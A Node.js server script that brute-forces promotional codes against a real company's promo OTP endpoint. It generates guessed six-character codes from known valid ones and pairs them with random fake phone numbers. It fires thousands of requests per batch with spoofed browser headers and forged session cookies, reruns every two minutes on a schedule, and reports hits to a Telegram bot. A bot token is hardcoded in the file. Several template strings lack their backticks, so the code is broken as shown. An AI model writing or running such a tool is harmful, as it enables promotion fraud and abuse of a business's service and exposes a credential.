const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const cron = require('node-cron');
const cors = require('cors');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Configuration
const CONFIG = {
    BOT_TOKEN: process.env.BOT_TOKEN || "8468676540:AAFsb4SPSlAD-5dNUmbQARL5Sj9cXlO7Oac",
    BASE_URL: "https://www.tictac.com",
    ENDPOINT: "/in/en/xp/jarpecarpromo/home/generateOTP",
    BATCH_SIZE: 5000,
    MAX_CONCURRENT: 200,
    WORKING_CODES: ["MTWCDY", "MY6BKC", "TPHV6T", "TH6HXF", "THBK38"],
    RENDER_KEEP_ALIVE: true
};

// Global state
let isRunning = false;
let successCodes = new Set();
let totalAttempts = 0;
let currentBatch = 0;
let connectedClients = new Set();

// Telegram API
const TELEGRAM_API = https://api.telegram.org/bot${CONFIG.BOT_TOKEN};

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// WebSocket connection handler
io.on('connection', (socket) => {
    console.log('🌐 Client connected:', socket.id);
    connectedClients.add(socket.id);
    
    // Send current status
    socket.emit('status', {
        isRunning,
        totalAttempts,
        successCount: successCodes.size,
        currentBatch,
        lastUpdate: new Date().toISOString()
    });
    
    // Send success codes
    socket.emit('successCodes', Array.from(successCodes));
    
    socket.on('disconnect', () => {
        console.log('❌ Client disconnected:', socket.id);
        connectedClients.delete(socket.id);
    });
});

// Broadcast to all connected clients
function broadcast(event, data) {
    io.emit(event, data);
}

// Pattern analysis
function analyzePatterns() {
    const patterns = {
        position_patterns: {},
        char_frequencies: {},
        structure_patterns: [],
        prefix_suffix: { prefix: {}, suffix: {} }
    };

    CONFIG.WORKING_CODES.forEach(code => {
        // Position analysis
        for (let i = 0; i < 6; i++) {
            if (!patterns.position_patterns[i]) {
                patterns.position_patterns[i] = {
                    letters: [],
                    digits: [],
                    common: [],
                    frequency: {}
                };
            }
            
            const char = code[i];
            if (char.match(/[A-Z]/)) {
                patterns.position_patterns[i].letters.push(char);
            } else {
                patterns.position_patterns[i].digits.push(char);
            }
            
            patterns.position_patterns[i].frequency[char] = 
                (patterns.position_patterns[i].frequency[char] || 0) + 1;
        }

        // Character frequency
        for (const char of code) {
            patterns.char_frequencies[char] = (patterns.char_frequencies[char] || 0) + 1;
        }

        // Structure pattern
        const structure = code.split('').map(c => c.match(/[A-Z]/) ? 'L' : 'D').join('');
        patterns.structure_patterns.push(structure);

        // Prefix/Suffix
        const prefix = code.substring(0, 2);
        const suffix = code.substring(4);
        patterns.prefix_suffix.prefix[prefix] = (patterns.prefix_suffix.prefix[prefix] || 0) + 1;
        patterns.prefix_suffix.suffix[suffix] = (patterns.prefix_suffix.suffix[suffix] || 0) + 1;
    });

    return patterns;
}

// Smart code generation
function generateSmartCodes(count, patterns) {
    const codes = new Set(CONFIG.WORKING_CODES);

    // Structure-based generation
    const structureWeights = {};
    patterns.structure_patterns.forEach(struct => {
        structureWeights[struct] = (structureWeights[struct] || 0) + 1;
    });for (const [struct, weight] of Object.entries(structureWeights)) {
        const structCount = Math.floor((count * weight) / Object.values(structureWeights).reduce((a, b) => a + b, 0));
        
        for (let i = 0; i < structCount; i++) {
            let code = '';
            for (const patternChar of struct) {
                if (patternChar === 'L') {
                    const letters = Object.keys(patterns.char_frequencies).filter(c => c.match(/[A-Z]/));
                    const weights = letters.map(c => patterns.char_frequencies[c] || 1);
                    code += weightedRandomChoice(letters, weights);
                } else {
                    code += Math.floor(Math.random() * 10).toString();
                }
            }
            codes.add(code);
        }
    }

    // Position-specific generation
    for (let i = 0; i < count * 0.3; i++) {
        let code = '';
        for (let pos = 0; pos < 6; pos++) {
            const posData = patterns.position_patterns[pos];
            const available = [...posData.letters, ...posData.digits];
            
            if (available.length > 0) {
                const weights = available.map(char => 
                    (patterns.char_frequencies[char] || 1) * 
                    (posData.frequency[char] || 1)
                );
                code += weightedRandomChoice(available, weights);
            } else {
                code += Math.random() < 0.6 ? 
                    randomChoice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') : 
                    randomChoice('0123456789');
            }
        }
        codes.add(code);
    }

    // Fill remaining with random
    while (codes.size < count) {
        codes.add(randomString(6, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'));
    }

    return Array.from(codes).slice(0, count);
}

// Helper functions
function randomString(length, chars) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomChoice(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function weightedRandomChoice(items, weights) {
    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
    let random = Math.random() * totalWeight;
    
    for (let i = 0; i < items.length; i++) {
        random -= weights[i];
        if (random <= 0) return items[i];
    }
    return items[items.length - 1];
}

// Phone number generation
function generatePhoneNumber() {
    const prefixes = ['7', '8', '9', '6'];
    const prefix = randomChoice(prefixes);
    const remaining = randomString(9, '0123456789');
    return prefix + remaining;
}

// Telegram notification
async function sendTelegramSuccess(code, phone) {
    const message = 
🎯 <b>REALTIME SUCCESS!</b>

🔑 <b>Code:</b> <code>${code}</code>
📱 <b>Phone:</b> <code>${phone}</code>
⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
📊 <b>Total Success:</b> ${successCodes.size} codes
🔄 <b>Batch:</b> ${currentBatch}
💻 <b>Mode:</b> Realtime WebSocket
    ;

    try {
        await axios.post(${TELEGRAM_API}/sendMessage, {
            chat_id: 'me',
            text: message.trim(),
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// TicTac API request
async function makeTicTacRequest(code, phone) {
    const headers = {
        'Host': 'www.tictac.com',
        'sec-ch-ua-platform': '"Windows"',
        'x-requested-with': 'XMLHttpRequest',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','sec-ch-ua-mobile': '?0',
        'origin': 'https://www.tictac.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i',
        'user-agent': randomChoice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
        ]),
        'cookie': PHPSESSID=1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 900) + 100}
    };

    const data = new URLSearchParams({
        phone: phone,
        ccode: code
    });

    try {
        const response = await axios.post(
            ${CONFIG.BASE_URL}${CONFIG.ENDPOINT},
            data,
            { headers, timeout: 5000 }
        );

        totalAttempts++;
        
        if (response.status === 200) {
            const responseData = response.data;
            if (responseData && typeof responseData === 'object') {
                if (JSON.stringify(responseData).toLowerCase().includes('success')) {
                    return { status: 'success', data: responseData };
                } else {
                    return { status: 'failed', data: responseData };
                }
            }
            return { status: 'failed', data: responseData };
        }
        return { status: 'error', error: HTTP ${response.status} };
        
    } catch (error) {
        return { status: 'error', error: error.message };
    }
}

// Main bruteforce function
async function executeBatch(codes, phones) {
    const results = [];
    let successCount = 0;
    
    console.log(🚀 Starting batch with ${codes.length} codes...);
    broadcast('batchStart', { 
        batchSize: codes.length, 
        timestamp: new Date().toISOString() 
    });
    
    // Process in smaller chunks for better performance
    const chunkSize = 50;
    const chunks = [];
    
    for (let i = 0; i < codes.length; i += chunkSize) {
        chunks.push({
            codes: codes.slice(i, i + chunkSize),
            phones: phones.slice(i, i + chunkSize)
        });
    }
    
    for (let chunkIndex = 0; chunkIndex < chunks.length; chunkIndex++) {
        const chunk = chunks[chunkIndex];
        const promises = chunk.codes.map((code, index) => 
            makeTicTacRequest(code, chunk.phones[index])
        );
        
        const chunkResults = await Promise.allSettled(promises);
        
        chunkResults.forEach((result, index) => {
            if (result.status === 'fulfilled') {
                const response = result.value;
                results.push(response);
                
                if (response.status === 'success') {
                    successCount++;
                    const code = chunk.codes[index];
                    const phone = chunk.phones[index];
                    
                    successCodes.add(code);
                    sendTelegramSuccess(code, phone);
                    
                    // Broadcast to all connected clients
                    broadcast('success', {
                        code: code,
                        phone: phone,
                        totalSuccess: successCodes.size,
                        timestamp: new Date().toISOString()
                    });
                    
                    console.log(🎯 SUCCESS #${successCount}: ${code});
                }
            }
        });
        
        // Progress update
        const progress = ((chunkIndex + 1) / chunks.length) * 100;broadcast('progress', {
            progress: progress,
            completed: (chunkIndex + 1) * chunkSize,
            total: codes.length,
            successCount: successCount,
            timestamp: new Date().toISOString()
        });
        
        // Small delay between chunks to prevent overwhelming
        if (chunkIndex < chunks.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
    
    return { results, successCount };
}

// Main bruteforce loop
async function runBruteforce() {
    if (isRunning) {
        console.log('⚠️  Bruteforce already running');
        return;
    }
    
    isRunning = true;
    currentBatch++;
    
    console.log(\n${'='*80});
    console.log(🚀 STARTING BATCH #${currentBatch} - ${CONFIG.BATCH_SIZE} codes);
    console.log(${'='*80});
    
    broadcast('status', { isRunning: true, currentBatch });
    
    const patterns = analyzePatterns();
    const codes = generateSmartCodes(CONFIG.BATCH_SIZE, patterns);
    const phones = Array.from({length: CONFIG.BATCH_SIZE}, () => generatePhoneNumber());
    
    console.log(🧠 Generated ${codes.length} smart codes);
    console.log(📱 Generated ${phones.length} phone numbers);
    console.log(⚡ Starting ${CONFIG.BATCH_SIZE} requests...);
    
    const startTime = Date.now();
    const { successCount } = await executeBatch(codes, phones);
    const endTime = Date.now();
    const duration = (endTime - startTime) / 1000;
    
    console.log(\n${'='*80});
    console.log(🏁 BATCH #${currentBatch} COMPLETED);
    console.log(⏱️  Duration: ${duration.toFixed(2)} seconds);
    console.log(🎯 Success: ${successCount} codes);
    console.log(📊 Success Rate: ${(successCount/CONFIG.BATCH_SIZE*100).toFixed(2)}%);
    console.log(⚡ Speed: ${(CONFIG.BATCH_SIZE/duration).toFixed(1)} codes/second);
    console.log(${'='*80});
    
    // Final broadcast
    broadcast('batchComplete', {
        batchNumber: currentBatch,
        duration: duration,
        successCount: successCount,
        successRate: (successCount/CONFIG.BATCH_SIZE*100),
        totalSuccess: successCodes.size,
        timestamp: new Date().toISOString()
    });
    
    isRunning = false;
    
    return { successCount, duration };
}

// Continuous running with cron
function startContinuousMode() {
    console.log('🔄 Starting continuous mode...');
    
    // Run every 2 minutes
    cron.schedule('*/2 * * * *', async () => {
        if (!isRunning) {
            console.log('\n⏰ Scheduled batch starting...');
            try {
                await runBruteforce();
            } catch (error) {
                console.error('❌ Batch error:', error);
                broadcast('error', { error: error.message, timestamp: new Date().toISOString() });
            }
        } else {
            console.log('⏳ Previous batch still running, skipping...');
        }
    });
    
    // Keep-alive for Render.com
    if (CONFIG.RENDER_KEEP_ALIVE) {
        cron.schedule('*/5 * * * *', () => {
            console.log('💓 Keep-alive ping');
            broadcast('keepalive', { timestamp: new Date().toISOString() });
        });
    }
}

// API Routes
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.get('/api/status', (req, res) => {
    res.json({
        isRunning,
        totalAttempts,
        successCount: successCodes.size,
        currentBatch,
        lastUpdate: new Date().toISOString(),
        workingCodes: Array.from(successCodes).slice(-10),
        config: {
            batchSize: CONFIG.BATCH_SIZE,
            maxConcurrent: CONFIG.MAX_CONCURRENT
        }
    });
});

app.post('/api/start', async (req, res) => {
    try {
        const result = await runBruteforce();
        res.json({ success: true, result });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/stop', (req, res) => {
    isRunning = false;
    res.json({ success: true, message: 'Stopping current batch...' });
});app.get('/api/codes', (req, res) => {
    res.json({
        successCodes: Array.from(successCodes),
        count: successCodes.size,
        lastUpdate: new Date().toISOString()
    });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(🚀 Server running on port ${PORT});
    console.log(🌐 WebSocket ready for realtime updates);
    console.log(📱 Telegram notifications enabled);
    
    // Start continuous mode
    startContinuousMode();
    
    // Run initial batch
    setTimeout(() => {
        console.log('🎯 Starting initial batch...');
        runBruteforce().catch(console.error);
    }, 5000);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
